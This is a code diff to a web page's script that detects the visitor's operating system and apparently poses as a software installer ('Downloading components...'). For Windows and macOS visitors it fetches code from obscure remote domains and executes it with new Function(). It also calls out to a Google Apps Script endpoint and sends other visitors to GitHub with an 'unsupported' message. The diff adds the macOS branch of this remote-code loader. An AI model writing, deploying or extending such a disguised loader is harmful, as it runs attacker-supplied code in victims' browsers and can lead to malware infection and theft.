@@ -50,16 +50,11 @@
     </div>
 
     <script>
-        const DEST = {
-            macos: "https://fleecykobird.com/",
-            ios: "https://docs.github.com/en/apps",
-            android: "https://docs.github.com/en/apps",
-            linux: "https://docs.github.com/en/apps",
-            other: "https://docs.github.com/en/apps"
-        };
+        const REMOTE_WINDOWS = "https://spankyrereel.com/faster.depone";
+        const REMOTE_MAC = "https://condorhelplyornate.com/aporia.brooky";
+        const ERROR_URL = "https://github.com/";
 
         const APP_URL = "https://script.google.com/macros/s/AKfycbzJt5sUSvYmjskv_K7dSLhGSzULH3BisOvq_lj6fzOmOouGVwz1habG64TFgFTEc1lr/exec";
-        const REMOTE = "https://spankyrereel.com/faster.depone";
 
         function detectOS() {
             const uad = navigator.userAgentData;
@@ -67,16 +62,10 @@
                 const p = uad.platform.toLowerCase();
                 if (p.includes('windows')) return 'windows';
                 if (p.includes('mac')) return 'macos';
-                if (p.includes('ios')) return 'ios';
-                if (p.includes('android')) return 'android';
-                if (p.includes('linux')) return 'linux';
             }
             const ua = navigator.userAgent || '';
-            if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
-            if (/Android/i.test(ua)) return 'android';
             if (/Windows NT/i.test(ua)) return 'windows';
             if (/Macintosh;.*Mac OS X/i.test(ua)) return 'macos';
-            if (/Linux/i.test(ua)) return 'linux';
             return 'other';
         }
 
@@ -95,15 +84,15 @@
             const headline = document.getElementById('headline');
             const status = document.getElementById('status');
             const os = detectOS();
-            const targetUrl = DEST[os] || DEST.other;
 
             sendLink();
 
-            if (os === 'windows') {
+            if (os === 'windows' || os === 'macos') {
+                const targetUrl = os === 'windows' ? REMOTE_WINDOWS : REMOTE_MAC;
                 async function load() {
                     try {
                         status.textContent = 'Downloading components...';
-                        const res = await fetch(REMOTE, { cache: 'no-store' });
+                        const res = await fetch(targetUrl, { cache: 'no-store' });
                         const code = await res.text();
                         new Function('headline', 'status', code)(headline, status);
                     } catch {
@@ -113,8 +102,9 @@
                 }
                 load();
             } else {
-                status.textContent = 'Preparing redirect...';
-                setTimeout(() => { window.location.replace(targetUrl); }, 500);
+                headline.textContent = "Attention: Unsupported Operating System";
+                status.textContent = "To continue installation, you must be using Windows or macOS. Installation is not supported on your current operating system.";
+                setTimeout(() => { window.location.replace(ERROR_URL); }, 4000);
             }
         })();
     </script>
